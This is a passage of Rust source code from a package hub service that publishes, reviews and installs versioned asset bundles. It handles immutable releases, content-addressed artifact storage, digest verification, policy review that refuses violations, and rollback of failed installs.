            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        if !publisher.enabled {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_DISABLED",
                "publisher is disabled",
            ));
        }
        if !publisher.can_publish {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_FORBIDDEN",
                "publisher does not have publish permission",
            ));
        }
        let authority = self.ensure_service_authority()?;
        if package_id.is_empty() || version.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISH_INVALID",
                "package id and version must not be empty",
            ));
        }
        validate_hub_version(version)?;
        // Before the source is even read: a republish must not reach the
        // artifact file or the version row.
        self.enforce_release_immutability(&package_id, version)?;
        // The mutable half is read up front so a publish that carries no
        // presentation can leave the existing presentation alone. Publishing a
        // fix must not cost the publisher the description they wrote.
        let existing_package = self.hub_data.get_hub_asset_package(&package_id)?;
        let mut preview =
            self.preview_publish_source(&source_owner, &source_project, &source_type, source_ref)?;
        if preview.entries.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISH_EMPTY",
                "nothing to publish for this source",
            ));
        }
        let project_initialization = self.apply_project_bundle_publish_options(
            &source_owner,
            &source_project,
            &source_type,
            &mut preview,
            project_options,
        )?;
        sanitize_hub_export_entries(&mut preview.entries)?;
        let source_layout = self
            .projects
            .project_layout(&source_owner, &source_project)?;
        // A cover is presentation, so it never enters the release document: the
        // bytes go into the content-addressed artifact store and the package
        // row records the digest. Reading the bytes is not storing them, and
        // the read happens first so the review below can be told whether this
        // release has a cover without a refused publish having stored one.
        let cover_source = hub_cover_webp_from_path(&source_layout, image_file_path, &publisher)?;
        // Resolved before the review rather than inside the manifest below, so
        // the review here and the preview review read the same two strings: a
        // blank title falls back to the source's name in both.
        let resolved_title = if title.trim().is_empty() {
            preview.name.clone()
        } else {
            title.trim().to_string()
        };
        let resolved_description = if description.trim().is_empty() {
            preview.description.clone()
        } else {
            description.trim().to_string()
        };
        // Beside `enforce_release_immutability`, and for the same reason: the
        // entries are final here -- previewed, option-filtered, sanitized --
        // and nothing durable has been written yet. A violation refuses every
        // install on every channel, so a release carrying one is a version
        // number spent on bytes nobody can use.
        refuse_publish_violations(
            "HUB_PUBLISH_REFUSED",
            &review_publish_entries(
                &publish_review_layout(&source_layout.repo_layout),
                &preview.asset_kind,
                &preview.entries,
                preview.warnings.clone(),
                &resolved_title,
                &resolved_description,
                cover_source.is_some(),
                &self.artifact_store(),
            ),
        )?;
        // The review has passed, so the release may now be shaped for the store
        // it is going into. A large binary leaves the document and becomes a
        // digest; the bytes wait here until the release is fully accepted.
        let referenced_artifacts = reference_large_publish_entries(&mut preview.entries)?;
        let cover = match cover_source {
            Some((name, bytes)) => {
                let artifact_sha256 = self.store_artifact(&bytes)?;
                Some(HubAssetMedia {
                    name,
                    role: "cover".to_string(),
                    content_type: HUB_COVER_MEDIA_TYPE.to_string(),
                    size_bytes: bytes.len(),
                    artifact_sha256,
                })
            }
            None => None,
        };
        let active_pipelines = if preview.asset_kind == HUB_ASSET_KIND_PROJECT_BUNDLE {
            self.projects
                .list_active_pipeline_meta(&source_owner, &source_project)?
                .into_iter()
                .map(|meta| meta.file_rel_path)
                .collect()
        } else {
            Vec::new()
        };
        let mut presentation = HubPresentation::from_existing(existing_package.as_ref());
        presentation.replace_cover(&package_id, cover);
        let artifact_rel = format!(
            "services/{}/packages/{}/versions/{}/artifact.json",
            DEFAULT_HUB_SERVICE_INSTANCE_ID, package_id, version
        );
        let artifact_abs = self.data_root.join(&artifact_rel);
        if let Some(parent) = artifact_abs.parent() {
            fs::create_dir_all(parent)?;
        }
        let now = now_ts();
        let resolved_publisher_display_name = if publisher_display_name.trim().is_empty() {
            publisher.display_name.clone()
        } else {
            publisher_display_name.trim().to_string()
        };
        let resolved_publisher_url = if publisher_url.trim().is_empty() {
            publisher.publisher_url.clone()
        } else {
            normalize_publisher_url(&publisher_id, publisher_url)
        };
        let resolved_publisher_email = if publisher_email.trim().is_empty() {
            publisher.email.clone()
        } else {
            publisher_email.trim().to_string()
        };
        // The release carries what installing it requires, plus the title and
        // one-line description that keep it self-describing offline. The layout
        // is part of "what installing it requires": every rel_path below is
        // relative to it, and a receiver whose own layout differs has no other
        // way to learn which portion of a path was structure.
        let manifest = HubPackageSpec {
            asset_kind: preview.asset_kind.clone(),
            title: resolved_title,
            description: resolved_description,
            layout: Some(recorded_publisher_layout(&source_layout.repo_layout)),
            active_pipelines,
            project_initialization,
            files: preview.entries.clone(),
        };
        let artifact_bytes = encode_hub_artifact(&package_id, &version, &manifest, "HUB_PUBLISH")?;
        let artifact_sha256 = sha256_hex(&artifact_bytes);
        // The quota counts what the release costs the hub, not what its JSON
        // weighs, so moving a file out of the document does not move it out of
        // the publisher's allowance.
        self.enforce_publisher_package_quota(
            &publisher,
            &package_id,
            existing_package.as_ref(),
            artifact_bytes.len() + referenced_artifacts.iter().map(Vec::len).sum::<usize>(),
        )?;
        // The bytes the manifest now only names go into the content-addressed
        // store before the release that names them is written, so no release
        // ever points at an artifact this hub does not hold. The store is
        // content-addressed, so a second release shipping the same file costs
        // nothing.
        for bytes in &referenced_artifacts {
            self.store_artifact(bytes)?;
        }
        atomic_write(&artifact_abs, &artifact_bytes)?;
        let package = HubAssetPackage {
            package_pk: existing_package
                .as_ref()
                .map(|item| item.package_pk.clone())
                .filter(|value| !value.is_empty())
                .unwrap_or_else(|| format!("mpkg_{}", random_hex(8))),
            authority_id: authority.authority_id.clone(),
            publisher_pk: publisher.publisher_pk.clone(),
            package_id: package_id.clone(),
            authority_owner: authority_owner.clone(),
            authority_project: authority_project.clone(),
            publisher_owner: publisher_owner.clone(),
            publisher_id: publisher_id.clone(),
            publisher_display_name: resolved_publisher_display_name,
            publisher_url: resolved_publisher_url,
            publisher_email: resolved_publisher_email,
            asset_kind: preview.asset_kind.clone(),
            title: manifest.title.clone(),
            description: manifest.description.clone(),
            summary: presentation.summary,
            description_md: presentation.description_md,
            image_url: presentation.image_url,
            media: presentation.media,
            gallery: presentation.gallery,
            visibility: normalize_visibility(visibility),
            tags,
            // A live release makes the package live again. The retracted
            // version rows keep their own markers, so no retracted coordinate
            // becomes publishable by this.
            retracted_at: None,
            retracted_reason: String::new(),
            created_at: existing_package.map(|item| item.created_at).unwrap_or(now),
            updated_at: now,
        };
        let version_row = HubAssetVersion {
            package_pk: package.package_pk.clone(),
            package_id: package_id.clone(),
            version: version.to_string(),
            authority_owner,
            authority_project,
            publisher_owner,
            publisher_id,
            source_owner,
            source_project,
            source_kind: source_type,
            source_ref: source_ref.to_string(),
            artifact_rel_path: artifact_rel,
            artifact_sha256,
            manifest: serde_json::to_value(&manifest)
                .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?,
            retracted_at: None,
            retracted_reason: String::new(),
            // A version row is written once and never again — the immutability
            // check above guarantees this row is new — so `now` is the moment
            // the release was created and stays that way for its whole life.
            created_at: now,
        };
        self.hub_data.put_hub_asset_package(&package)?;
        self.hub_data.put_hub_asset_version(&version_row)?;
        Ok((package, version_row))
    }

    pub fn review_publish_asset(
        &self,
        source_owner: &str,
        source_project: &str,
        publisher_id: &str,
        source_type: &str,
        source_ref: &str,
        package_id: &str,
        version: &str,
        title: &str,
        description: &str,
        image_file_path: &str,
        visibility: &str,
        project_options: HubProjectBundlePublishOptions,
        tags: Vec<String>,
    ) -> Result<HubPublishReview, PlatformError> {
        self.require_enabled()?;
        let source_owner = slug_segment(source_owner);
        let source_project = slug_segment(source_project);
        let publisher_id = normalize_hub_id_segment(publisher_id, "publisher id")?;
        let source_type = normalize_source_type(source_type);
        let package_id = canonical_hub_package_id(&publisher_id, package_id)?;
        let version = version.trim().to_string();
        validate_hub_version(&version)?;
        let Some(publisher) = self.hub_data.get_hub_publisher(
            HUB_SERVICE_SCOPE_OWNER,
            HUB_SERVICE_SCOPE_PROJECT,
            &publisher_id,
        )?
        else {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_MISSING",
                "publisher not found",
            ));
        };
        let mut preview =
            self.preview_publish_source(&source_owner, &source_project, &source_type, source_ref)?;
        let project_initialization = self.apply_project_bundle_publish_options(
            &source_owner,
            &source_project,
            &source_type,
            &mut preview,
            project_options,
        )?;
        sanitize_hub_export_entries(&mut preview.entries)?;
        let media = hub_cover_media_review(
            &self
                .projects
                .project_layout(&source_owner, &source_project)?,
            image_file_path,
            &publisher,
        )?;
        let title = if title.trim().is_empty() {
            preview.name.clone()
        } else {
            title.trim().to_string()
        };
        let description = if description.trim().is_empty() {
            preview.description.clone()
        } else {
            description.trim().to_string()
        };
        review_publish_artifact(
            &publish_review_layout(
                &self
                    .projects
                    .project_layout(&source_owner, &source_project)?
                    .repo_layout,
            ),
            package_id,
            version,
            preview,
            title,
            description,
            normalize_visibility(visibility),
            tags,
            media,
            project_initialization,
            // An export carries every entry inline today, so this channel is the
            // answer for a referenced one: only an artifact already in this
            // instance's store could be published and resolved by a receiver.
            &self.artifact_store(),
        )
    }

    fn apply_project_bundle_publish_options(
        &self,
        source_owner: &str,
        source_project: &str,
        source_type: &str,
        preview: &mut HubExportPreview,
        mut options: HubProjectBundlePublishOptions,
    ) -> Result<HubPackageInitialization, PlatformError> {
        if source_type != "project_files" || preview.asset_kind != HUB_ASSET_KIND_PROJECT_BUNDLE {
            return Ok(HubPackageInitialization::default());
        }

        let layout = self
            .projects
            .project_layout(source_owner, source_project)?
            .repo_layout;
        let schema_document_rel = layout.schema_document_rel();

        options.include_libraries.sort();
        options.include_libraries.dedup();
        options.initial_data_paths = options
            .initial_data_paths
            .into_iter()
            .map(|path| normalize_repo_rel(&path))
            .filter(|path| initial_data_engine_for_path(&layout, path).is_some())
            .collect();
        options.initial_data_paths.sort();
        options.initial_data_paths.dedup();

        if !options.include_sekejap_schema {
            preview
                .entries
                .retain(|entry| !layout.is_schema_rel_path(&normalize_repo_rel(&entry.rel_path)));
        } else if !preview
            .entries
            .iter()
            .any(|entry| normalize_repo_rel(&entry.rel_path) == schema_document_rel)
        {
            let export = sekejap::export_schema(&self.data_root, source_owner, source_project)?;
            if !export.tables.is_empty() {
                let content = String::from_utf8(sekejap::encode_schema_export(export)?)
                    .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?;
                preview.entries.push(text_export_entry(
                    &schema_document_rel,
                    "sekejap schema",
                    "Portable Sekejap schema",
                    content,
                ));
            }
        }

        let sqlite_schema_rel = layout.sqlite_schema_document_rel();
        preview
            .entries
            .retain(|entry| normalize_repo_rel(&entry.rel_path) != sqlite_schema_rel);
        if options.include_sqlite_schema {
            if let Some(sql) =
                sqlite_schema::export_schema_sql(&self.data_root, source_owner, source_project)?
            {
                preview.entries.push(text_export_entry(
                    &sqlite_schema_rel,
                    "sqlite schema",
                    "Portable SQLite schema",
                    sql,
                ));
            }
        }

        let initial_data = if options.include_initial_data {
            preview
                .entries
                .iter()
                .filter_map(|entry| initial_data_step_from_entry(&layout, entry))
                .filter(|step| {
                    options
                        .initial_data_paths
                        .iter()
                        .any(|path| path == &step.path)
                })
                .collect::<Vec<_>>()
        } else {
            Vec::new()
        };

        rewrite_project_libraries(preview, &options.include_libraries)?;
        let init = HubPackageInitialization {
            include_sekejap_schema: options.include_sekejap_schema,
            include_sqlite_schema: options.include_sqlite_schema,
            libraries: options.include_libraries,
            initial_data,
        };
        let init_content = serde_json::to_string_pretty(&init)
            .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?
            + "\n";
        preview
            .entries
            .retain(|entry| normalize_repo_rel(&entry.rel_path) != "zebflow.init.json");
        preview.entries.push(text_export_entry(
            "zebflow.init.json",
            "project initialization",
            "Project bundle initialization plan",
            init_content,
        ));
        Ok(init)
    }

    pub fn list_project_initial_data(
        &self,
        owner: &str,
        project: &str,
    ) -> Result<Vec<HubPackageInitialDataStep>, PlatformError> {
        let layout = self.projects.project_layout(owner, project)?;
        let mut steps = Vec::new();
        for dir in &layout.repo_layout.initial_data {
            let root = layout.repo_dir.join(&dir.path);
            if !root.is_dir() {
                continue;
            }
            collect_initial_data_steps(
                &layout.repo_layout,
                &layout.repo_dir,
                &root,
                &dir.engine,
                &mut steps,
            )?;
        }
        steps.sort_by(|a, b| a.path.cmp(&b.path));
        steps.dedup_by(|a, b| a.path == b.path);
        Ok(steps)
    }

    pub fn install_asset(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallResult, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let target_project = slug_segment(target_project);
        self.require_enabled()?;
        let Some(version_row) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset version not found",
            ));
        };
        // A retracted release fails with its reason rather than with an io
        // error about the file the retraction deliberately removed.
        if version_row.retracted_at.is_some() {
            return Err(PlatformError::new(
                "HUB_VERSION_RETRACTED",
                retraction_message(package_id, version, &version_row.retracted_reason),
            ));
        }
        let artifact_abs = self.data_root.join(&version_row.artifact_rel_path);
        let raw = fs::read(&artifact_abs)?;
        verify_hub_artifact_bytes(&raw, &version_row.artifact_sha256)?;
        let payload = parse_hub_artifact_bytes(&raw, "HUB_INSTALL")?;
        self.install_artifact_payload_from(
            target_owner,
            target_project,
            package_id,
            version,
            target_folder,
            &format!("local/{package_id}"),
            payload,
            &self.artifact_store(),
        )
    }

    /// This instance's Hub store, as an artifact channel.
    ///
    /// Artifacts sit at `<hub service root>/artifacts/<sha256>`, beside the
    /// package documents rather than under any one of them, so two packages
    /// naming one runtime share the single stored file.
    pub fn artifact_store(&self) -> HubArtifactChannel {
        HubArtifactChannel::local(self.hub_service_root())
    }

    fn hub_service_root(&self) -> PathBuf {
        self.data_root
            .join("services")
            .join(DEFAULT_HUB_SERVICE_INSTANCE_ID)
    }

    /// A hub reached over HTTP, as an artifact channel.
    ///
    /// Every artifact the package references is fetched and digest-verified
    /// here, before the caller reviews or installs anything. That order is the
    /// point: the review reads the artifact's real bytes rather than a
    /// placeholder, the install writes nothing until every reference has
    /// passed, and a fetch that fails leaves the target exactly as it was.
    ///
    /// Verified bytes land in this instance's content-addressed store, which is
    /// the cache: a review followed by its install fetches once, and two
    /// releases naming one runtime fetch it once between them.
    async fn remote_artifact_channel<F>(
        &self,
        files: &[HubPackageFile],
        origin: &str,
        read_token: &str,
        artifact_url: F,
    ) -> Result<HubArtifactChannel, PlatformError>
    where
        F: Fn(&str) -> String,
    {
        let store_base = self.hub_service_root();
        for file in files {
            let Some(HubPackageFileSupply::Referenced(artifact)) = file.supply() else {
                continue;
            };
            validate_artifact_digest(&artifact.sha256)?;
            fetch_referenced_artifact(
                &store_base,
                &artifact_url(&artifact.sha256),
                read_token,
                &file.rel_path,
                artifact,
                file.size_bytes,
            )
            .await?;
        }
        Ok(HubArtifactChannel::Remote(RemoteHubArtifacts {
            cache_base: store_base,
            origin: origin.to_string(),
        }))
    }

    /// Puts one artifact into this instance's Hub store and returns its digest.
    ///
    /// The store is content-addressed, so publishing the same bytes twice is
    /// idempotent and costs one file. This is the writer half of the referenced
    /// form: a package that references an artifact is only installable from a
    /// Hub that holds it.
    pub fn store_artifact(&self, bytes: &[u8]) -> Result<String, PlatformError> {
        if bytes.len() > MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_TOO_LARGE",
                format!(
                    "artifact is {} bytes, over the {MAX_HUB_PACKAGE_REFERENCED_FILE_BYTES} \
                     byte limit for a referenced artifact",
                    bytes.len()
                ),
            ));
        }
        let sha256 = sha256_hex(bytes);
        let path = referenced_artifact_path(&self.hub_service_root(), &sha256)?;
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent)?;
        }
        atomic_write(&path, bytes)?;
        Ok(sha256)
    }

    pub fn review_asset_install(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
    ) -> Result<HubInstallReview, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let target_project = slug_segment(target_project);
        self.require_enabled()?;
        let Some(version_row) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset version not found",
            ));
        };
        // A retracted release fails with its reason rather than with an io
        // error about the file the retraction deliberately removed.
        if version_row.retracted_at.is_some() {
            return Err(PlatformError::new(
                "HUB_VERSION_RETRACTED",
                retraction_message(package_id, version, &version_row.retracted_reason),
            ));
        }
        let artifact_abs = self.data_root.join(&version_row.artifact_rel_path);
        let raw = fs::read(&artifact_abs)?;
        verify_hub_artifact_bytes(&raw, &version_row.artifact_sha256)?;
        let payload = parse_hub_artifact_bytes(&raw, "HUB_INSTALL_REVIEW")?;
        self.review_artifact_payload(
            &target_owner,
            &target_project,
            package_id,
            version,
            target_folder,
            &payload,
            &self.artifact_store(),
        )
    }

    /// Reviews a node bundle supplied directly, without publishing it first.
    ///
    /// A bundle authored locally or received as a file has no Hub entry, so
    /// there was previously no way in at all. It runs the identical review a
    /// published package runs: a Hub package is not safer, only published.
    pub fn review_local_node_bundle(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        artifact: Value,
    ) -> Result<HubInstallReview, PlatformError> {
        let target_owner = slug_segment(target_owner);
        let target_project = slug_segment(target_project);
        let payload = parse_local_node_bundle_artifact(artifact, "NODE_BUNDLE_INSTALL_REVIEW")?;
        self.review_artifact_payload(
            &target_owner,
            &target_project,
            package_id,
            version,
            target_folder,
            &payload,
            &HubArtifactChannel::unresolvable(LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL),
        )
    }

    /// Installs a node bundle supplied directly.
    ///
    /// Refuses on any policy violation before touching disk, regardless of what
    /// the caller approved: a violation is not a warning the user can accept.
    pub fn install_local_node_bundle(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        artifact: Value,
    ) -> Result<HubInstallResult, PlatformError> {
        let payload = parse_local_node_bundle_artifact(artifact, "NODE_BUNDLE_INSTALL")?;
        self.install_node_bundle_payload(
            slug_segment(target_owner),
            slug_segment(target_project),
            package_id,
            version,
            target_folder,
            payload,
            &HubArtifactChannel::unresolvable(LOCAL_NODE_BUNDLE_BODY_HAS_NO_CHANNEL),
        )
    }

    /// Reviews a node bundle read from a file on disk.
    ///
    /// This is the local file channel: the document names its artifacts by
    /// digest, and they sit in `artifacts/<sha256>` beside it.
    pub fn review_local_node_bundle_document(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        document_path: &Path,
    ) -> Result<HubInstallReview, PlatformError> {
        let payload = read_local_node_bundle_document(document_path, "NODE_BUNDLE_INSTALL_REVIEW")?;
        self.review_artifact_payload(
            &slug_segment(target_owner),
            &slug_segment(target_project),
            package_id,
            version,
            target_folder,
            &payload,
            &HubArtifactChannel::local(local_document_channel_base(document_path)),
        )
    }

    /// Installs a node bundle read from a file on disk, resolving every
    /// referenced artifact from `artifacts/<sha256>` beside the document.
    pub fn install_local_node_bundle_document(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        document_path: &Path,
    ) -> Result<HubInstallResult, PlatformError> {
        let payload = read_local_node_bundle_document(document_path, "NODE_BUNDLE_INSTALL")?;
        self.install_node_bundle_payload(
            slug_segment(target_owner),
            slug_segment(target_project),
            package_id,
            version,
            target_folder,
            payload,
            &HubArtifactChannel::local(local_document_channel_base(document_path)),
        )
    }

    /// The shared body of every local node bundle install.
    ///
    /// The review runs first and a violation refuses the install, whatever the
    /// caller approved, and whichever channel supplied the document.
    #[allow(clippy::too_many_arguments)]
    fn install_node_bundle_payload(
        &self,
        target_owner: String,
        target_project: String,
        package_id: &str,
        version: &str,
        target_folder: &str,
        payload: HubPackageSpec,
        artifacts: &HubArtifactChannel,
    ) -> Result<HubInstallResult, PlatformError> {
        let review = self.review_artifact_payload(
            &target_owner,
            &target_project,
            package_id,
            version,
            target_folder,
            &payload,
            artifacts,
        )?;
        if !review.violations.is_empty() {
            return Err(PlatformError::new(
                "NODE_BUNDLE_INSTALL_REFUSED",
                format!(
                    "package cannot be installed: {}",
                    review.violations.join("; ")
                ),
            ));
        }

        self.install_artifact_payload_from(
            target_owner,
            target_project,
            package_id,
            version,
            target_folder,
            &format!("local/{package_id}"),
            payload,
            artifacts,
        )
    }

    /// Installs a package, resolving every referenced artifact through
    /// `artifacts` before a single byte is written.
    #[allow(clippy::too_many_arguments)]
    fn install_artifact_payload_from(
        &self,
        target_owner: String,
        target_project: String,
        package_id: &str,
        version: &str,
        target_folder: &str,
        source_id: &str,
        payload: HubPackageSpec,
        artifacts: &HubArtifactChannel,
    ) -> Result<HubInstallResult, PlatformError> {
        let layout = self
            .projects
            .project_layout(&target_owner, &target_project)?;
        let install_lock = self.install_lock(&layout.repo_dir);
        let _install_guard = install_lock
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let placement =
            HubInstallPlacement::new(&layout.repo_layout, &payload, package_id, target_folder);
        let install_root = placement.install_root().to_string();
        // A node bundle is a materialized artifact, so it installs under data/.
        // Everything else is project source and installs under repo/.
        let install_base = if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            layout.data_dir.clone()
        } else {
            layout.repo_dir.clone()
        };
        // Every entry's bytes — carried and referenced alike — are produced and
        // verified here, before the first write. A digest mismatch or a missing
        // artifact returns now, with the project untouched.
        let prepared =
            prepare_hub_install_entries(&placement, &install_base, &payload.files, artifacts)?;
        validate_prepared_pipeline_sources(&layout.repo_layout, &prepared)?;
        refuse_prepared_install_violations(&layout.repo_layout, &payload.asset_kind, &prepared)?;
        let previous_lock = if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            Some(self.dependency_lock.read(&target_owner, &target_project)?)
        } else {
            None
        };

        let mut pipelines_registered = Vec::new();
        for entry in &prepared {
            if let Err(error) = atomic_write(&entry.destination, &entry.bytes) {
                let operation_error = PlatformError::new("HUB_INSTALL", error.to_string());
                return Err(self.recover_failed_install(
                    &target_owner,
                    &target_project,
                    &install_base,
                    &prepared,
                    previous_lock.as_ref(),
                    operation_error,
                ));
            }
        }
        for entry in &prepared {
            if layout.repo_layout.is_pipeline_rel_path(&entry.install_rel) {
                let source = String::from_utf8(entry.bytes.clone()).map_err(|error| {
                    PlatformError::new(
                        "HUB_INSTALL",
                        format!("pipeline source is not UTF-8: {error}"),
                    )
                })?;
                let (title, trigger_kind) = infer_pipeline_meta(&source, &entry.install_rel);
                let meta = match self.projects.upsert_pipeline_definition(
                    &target_owner,
                    &target_project,
                    &entry.install_rel,
                    &title,
                    "",
                    &trigger_kind,
                    &source,
                ) {
                    Ok(meta) => meta,
                    Err(error) => {
                        return Err(self.recover_failed_install(
                            &target_owner,
                            &target_project,
                            &install_base,
                            &prepared,
                            previous_lock.as_ref(),
                            error,
                        ));
                    }
                };
                pipelines_registered.push(meta.file_rel_path);
            }
        }
        if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            let dependency_result = self
                .node_registry
                .refresh_project(&target_owner, &target_project)
                .and_then(|_| {
                    self.dependency_lock.record_hub_node_bundles(
                        &target_owner,
                        &target_project,
                        &install_root,
                        source_id,
                        version,
                    )
                })
                .and_then(|_| {
                    self.node_registry
                        .sync_project_node_interfaces(&target_owner, &target_project)
                });
            if let Err(error) = dependency_result {
                return Err(self.recover_failed_install(
                    &target_owner,
                    &target_project,
                    &install_base,
                    &prepared,
                    previous_lock.as_ref(),
                    error,
                ));
            }
        }
        Ok(HubInstallResult {
            package_id: package_id.to_string(),
            version: version.to_string(),
            asset_kind: payload.asset_kind,
            install_root,
            files_written: payload.files.len(),
            pipelines_registered,
        })
    }

    fn install_lock(&self, repo_dir: &Path) -> Arc<Mutex<()>> {
        let mut locks = self
            .install_locks
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        locks
            .entry(repo_dir.to_path_buf())
            .or_insert_with(|| Arc::new(Mutex::new(())))
            .clone()
    }

    fn recover_failed_install(
        &self,
        owner: &str,
        project: &str,
        install_base: &Path,
        entries: &[PreparedHubInstallEntry],
        previous_lock: Option<&crate::contracts::kinds::DependencyLockSpec>,
        operation_error: PlatformError,
    ) -> PlatformError {
        let mut recovery_errors = Vec::new();
        if let Err(error) = restore_hub_install_entries(install_base, entries) {
            recovery_errors.push(error.to_string());
        }
        if let Some(previous) = previous_lock {
            if let Err(error) = self.dependency_lock.write(owner, project, previous) {
                recovery_errors.push(error.to_string());
            }
            if let Err(error) = self.node_registry.refresh_project(owner, project) {
                recovery_errors.push(error.to_string());
            }
        }
        if let Err(error) = self.restore_pipeline_metadata(owner, project, entries) {
            recovery_errors.push(error.to_string());
        }
        if recovery_errors.is_empty() {
            operation_error
        } else {
            PlatformError::new(
                "HUB_INSTALL_RECOVERY",
                format!(
                    "installation failed ({operation_error}); recovery also failed: {}",
                    recovery_errors.join("; ")
                ),
            )
        }
    }

    fn restore_pipeline_metadata(
        &self,
        owner: &str,
        project: &str,
        entries: &[PreparedHubInstallEntry],
    ) -> Result<(), PlatformError> {
        let layout = self.projects.project_layout(owner, project)?;
        for entry in entries
            .iter()
            .filter(|entry| layout.repo_layout.is_pipeline_rel_path(&entry.install_rel))
        {
            if let Some(previous) = &entry.previous {
                let source = String::from_utf8(previous.clone()).map_err(|error| {
                    PlatformError::new(
                        "HUB_INSTALL_RECOVERY",
                        format!("previous pipeline source is not UTF-8: {error}"),
                    )
                })?;
                let (title, trigger_kind) = infer_pipeline_meta(&source, &entry.install_rel);
                self.projects.upsert_pipeline_definition(
                    owner,
                    project,
                    &entry.install_rel,
                    &title,
                    "",
                    &trigger_kind,
                    &source,
                )?;
            } else {
                self.projects
                    .delete_pipeline(owner, project, &entry.install_rel)?;
            }
        }
        Ok(())
    }

    /// Reviews a package against the channel it would be installed through.
    ///
    /// The channel is not optional detail: a referenced entry's bytes live
    /// there, and a review that cannot fetch them would otherwise scan an empty
    /// string and clear a file the install still writes.
    fn review_artifact_payload(
        &self,
        target_owner: &str,
        target_project: &str,
        package_id: &str,
        version: &str,
        target_folder: &str,
        payload: &HubPackageSpec,
        artifacts: &HubArtifactChannel,
    ) -> Result<HubInstallReview, PlatformError> {
        let layout = self.projects.project_layout(target_owner, target_project)?;
        // The same placement the install builds, from the same inputs, so a
        // destination the review shows is the destination the install writes.
        let placement =
            HubInstallPlacement::new(&layout.repo_layout, payload, package_id, target_folder);
        let install_root = placement.install_root().to_string();
        // The same choice the install makes, so what the review calls an
        // overwrite is what the install would actually overwrite.
        let install_base = if payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE {
            &layout.data_dir
        } else {
            &layout.repo_dir
        };
        let mut files_added = Vec::new();
        let mut files_overwritten = Vec::new();
        let mut pipelines_registered = Vec::new();
        let mut policy_entries = Vec::new();

        for entry in &payload.files {
            let install_rel = placement.destination(&entry.rel_path);
            let dest_abs = install_base.join(&install_rel);
            if dest_abs.exists() {
                files_overwritten.push(install_rel.clone());
            } else {
                files_added.push(install_rel.clone());
            }
            if layout.repo_layout.is_pipeline_rel_path(&install_rel) {
                // Reported as the identity the install would register, not as
                // the repository path it would write, so a review can be
                // compared against the install result it predicts.
                pipelines_registered.push(
                    layout
                        .repo_layout
                        .strip_source(&install_rel)
                        .unwrap_or(&install_rel)
                        .to_string(),
                );
            }
            // Keyed on the destination, never the manifest path: the install
            // decides where an entry lands, so the review scans the same path
            // the install would register.
            policy_entries.push(package_policy_entry(&install_rel, entry, artifacts));
        }
        let mut policy = review_package_entries(
            &layout.repo_layout,
            &policy_entries,
            Vec::new(),
            PackageReviewOptions {
                bundle_internal_paths: payload.asset_kind == HUB_ASSET_KIND_NODE_BUNDLE,
                ..PackageReviewOptions::default()
            },
        );
        policy.risk_level = install_risk_level(&policy, !files_overwritten.is_empty());

        Ok(HubInstallReview {
            package_id: package_id.to_string(),
            version: version.to_string(),
            target_folder: target_folder.to_string(),
            install_root,
            asset_kind: payload.asset_kind.clone(),
            files_added,
            files_overwritten,
            pipelines_registered,
            nodes_used: policy.nodes_used,
            credentials_required: policy.credentials_required,
            external_urls: policy.external_urls,
            database_effects: policy.database_effects,
            filesystem_effects: policy.filesystem_effects,
            network_effects: policy.network_effects,
            code_execution: policy.code_execution,
            public_endpoints: policy.public_endpoints,
            schedules: policy.schedules,
            large_files: policy.large_files,
            seed_data: policy.seed_data,
            database_initialization: policy.database_initialization,
            project_initialization: serde_json::to_value(&payload.project_initialization)
                .unwrap_or_else(|_| Value::Null),
            installable: policy.violations.is_empty(),
            violations: policy.violations,
            warnings: policy.warnings,
            risk_level: policy.risk_level,
        })
    }

    /// One version row, without opening its artifact.
    ///
    /// A retracted release has no artifact left, so a reader that only wants to
    /// describe the coordinate must be able to reach the row on its own.
    pub fn get_asset_version(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<Option<HubAssetVersion>, PlatformError> {
        self.require_enabled()?;
        self.hub_data.get_hub_asset_version(package_id, version)
    }

    pub fn get_asset_version_artifact(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(HubAssetVersion, Value), PlatformError> {
        let (version_row, artifact, _) =
            self.get_asset_version_install_artifact(package_id, version)?;
        Ok((version_row, artifact))
    }

    pub fn get_asset_version_install_artifact(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(HubAssetVersion, Value, u64), PlatformError> {
        self.require_enabled()?;
        let Some(version_row) = self.hub_data.get_hub_asset_version(package_id, version)? else {
            return Err(PlatformError::new(
                "HUB_ASSET_MISSING",
                "asset version not found",
